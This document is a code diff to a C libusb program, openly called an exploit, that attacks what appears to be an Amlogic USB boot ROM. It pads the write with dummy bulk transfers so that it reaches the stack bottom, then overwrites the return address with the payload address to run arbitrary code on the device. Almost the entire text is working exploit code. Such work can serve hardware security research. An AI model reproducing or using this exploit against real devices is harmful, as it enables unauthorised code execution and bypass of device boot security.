@@ -20,11 +20,12 @@
 #endif
 
 #define LOAD_ADDR           0xfffa0000
-#define REQ_WR_LARGE_MEM    0x11
+#define PAYLOAD_ADDR           0xfffe3000
+#define AM_REQ_WR_LARGE_MEM    0x11
+#define MAX_PAYLOAD_SIZE	0x688
 
 libusb_device_handle *handle = NULL;
 
-#define MAX_PAYLOAD_SIZE	0x10000
 typedef struct __attribute__ ((__packed__)) dldata_s {
 	u_int32_t addr;
 	u_int32_t size;
@@ -38,19 +39,21 @@ static int exploit(dldata_t *payload) {
     uint8_t bmRequestType, bRequest = 0;
     uint16_t wValue, wIndex, wLength = 0;
     bmRequestType = 0x40;
-    bRequest = REQ_WR_LARGE_MEM;
+    bRequest = AM_REQ_WR_LARGE_MEM;
     wValue = 0x1000;
-    wIndex = 0x100;
+    wIndex = 0x43 + 0x1;// 0x43 empty transfers (0xfffa0000 + (0x1000 * 0x43) = 0xfffe3000 => stack bottom) + 0x1 payload transfer
     wLength = sizeof(dldata_t);
+
 	printf("- exploit: starting.\n");
 	rc = libusb_control_transfer(handle, bmRequestType, bRequest, wValue, wIndex, (uint8_t*)payload, wLength, 0);
-	if(rc <= 0) {
+	if(rc != wLength) {
 		printf("libusb_control_transfer : error %d\n", rc);
 		fprintf(stderr, "Error libusb_control_transfer: %s\n", libusb_error_name(rc));
 		return rc;
 	}
 
-	for (i = 0; i < wIndex-1; i++){
+	printf("- exploit: sending %u dummy transfers...\n", wIndex - 1);
+	for (i = 0; i < wIndex - 1; i++){
 		rc = libusb_bulk_transfer(handle, LIBUSB_ENDPOINT_OUT | 2, (uint8_t *)&payload->data, 0, &transferred, 0);
 		if(rc) {
 			printf("libusb_bulk_transfer LIBUSB_ENDPOINT_OUT: error %d\n", rc);
@@ -60,8 +63,11 @@ static int exploit(dldata_t *payload) {
         dprint("libusb_bulk_transfer[%u]: transferred=%d\n", i, transferred);
 	}
 
+	//overwrite return address with payload address
+	((uint32_t*)payload->data)[MAX_PAYLOAD_SIZE/4] = PAYLOAD_ADDR;
+
 	printf("- exploit: sending last transfer to overwrite RAM...\n");
-	rc = libusb_bulk_transfer(handle, LIBUSB_ENDPOINT_OUT | 2, (uint8_t *)&payload->data, wValue, &transferred, 0);
+	rc = libusb_bulk_transfer(handle, LIBUSB_ENDPOINT_OUT | 2, (uint8_t *)&payload->data, payload->size, &transferred, 0);
 	if(rc) {
 		printf("libusb_bulk_transfer LIBUSB_ENDPOINT_OUT: error %d\n", rc);
 		fprintf(stderr, "Error libusb_bulk_transfer: %s\n", libusb_error_name(rc));
@@ -100,12 +106,11 @@ int main(int argc, char *argv[])
         fprintf(stderr, "Error: input payload size cannot exceed %u bytes !\n", MAX_PAYLOAD_SIZE);
         return EXIT_FAILURE;
     }
-    payload_size = sizeof(dldata_t) + MAX_PAYLOAD_SIZE;
-
+    payload_size = MAX_PAYLOAD_SIZE + 4;//extra 4 bytes to overwrite return address
 
 	payload = (dldata_t*)calloc(1, payload_size);
     payload->addr = LOAD_ADDR;
-	payload->size = fd_size;
+	payload->size = payload_size;
 
 	fseek(fd, 0, SEEK_SET);
 	payload_size = fread(&payload->data, 1, fd_size, fd);
@@ -149,7 +154,7 @@ int main(int argc, char *argv[])
 		libusb_close (handle);
 	}
 
-	libusb_exit (NULL);
+	//libusb_exit(NULL);//double free on qubes os...
 
 	return EXIT_SUCCESS;
 }
